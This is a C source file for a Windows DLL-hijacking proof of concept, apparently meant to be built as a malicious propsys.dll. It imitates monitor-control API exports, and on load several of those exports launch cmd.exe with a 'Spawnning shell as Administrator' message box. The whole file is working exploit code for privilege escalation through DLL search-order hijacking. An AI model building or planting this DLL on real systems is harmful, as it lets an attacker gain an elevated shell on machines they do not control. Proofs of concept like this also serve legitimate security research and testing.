#include <windows.h> 
#include <Winuser.h> 
 
// i86-w64-mingw32-gcc -shared -o propsys.dll propsys.c -lcomctl32 -Wl,--subsystem,windows  

//  @404death

int DestroyPhysicalMonitors(){
//    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
//    WinExec("C:\\windows\\system32\\cmd.exe", 0);
//    ExitProcess(0);
    return 0;
}
int GetMonitorBrightness(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int GetMonitorContrast(){
//    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
//    WinExec("C:\\windows\\system32\\cmd.exe", 0);
//    ExitProcess(0);
    return 0;
}
int GetNumberOfPhysicalMonitorsFromHMONITOR(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int GetPhysicalMonitorsFromHMONITOR(){
//    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
//    WinExec("C:\\windows\\system32\\cmd.exe", 0);
//    ExitProcess(0);
    return 0;
}
int GetVCPFeatureAndVCPFeatureReply(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int SetMonitorBrightness(){
//    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
//    WinExec("C:\\windows\\system32\\cmd.exe", 0);
//    ExitProcess(0);
    return 0;
}
int SetMonitorContrast(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int SetVCPFeature(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
BOOL WINAPI DllMain (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)  
{  
  if (fdwReason == DLL_PROCESS_ATTACH)  
  {  
    DestroyPhysicalMonitors(); 
    GetMonitorBrightness(); 
    GetMonitorContrast(); 
    GetNumberOfPhysicalMonitorsFromHMONITOR(); 
    GetPhysicalMonitorsFromHMONITOR(); 
    GetVCPFeatureAndVCPFeatureReply(); 
    SetMonitorBrightness();
    SetMonitorContrast(); 
    SetVCPFeature(); 

  }  
  
  return TRUE;  
}  